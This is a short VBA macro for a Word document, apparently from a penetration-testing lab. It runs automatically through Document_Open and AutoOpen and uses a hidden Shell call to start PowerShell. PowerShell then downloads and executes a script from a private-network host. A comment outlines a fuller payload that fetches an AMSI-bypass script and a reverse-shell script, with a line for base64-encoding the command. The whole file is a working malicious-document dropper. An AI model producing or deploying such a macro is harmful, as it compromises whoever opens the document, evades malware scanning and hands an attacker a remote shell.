Function NTj()
    Dim EOu As String

    ' $str = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/tools/Disable-AMSI.ps1'); Disable-AMSI; Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/rev.ps1')"; 
    ' [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($)) | clip
    
    EOu = "powershell.exe -NoProfile -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.49.109/foo')"
    
    Shell EOu, vbHide
End Function

Sub Document_Open()
    NTj
End Sub

Sub AutoOpen()
    NTj
End Sub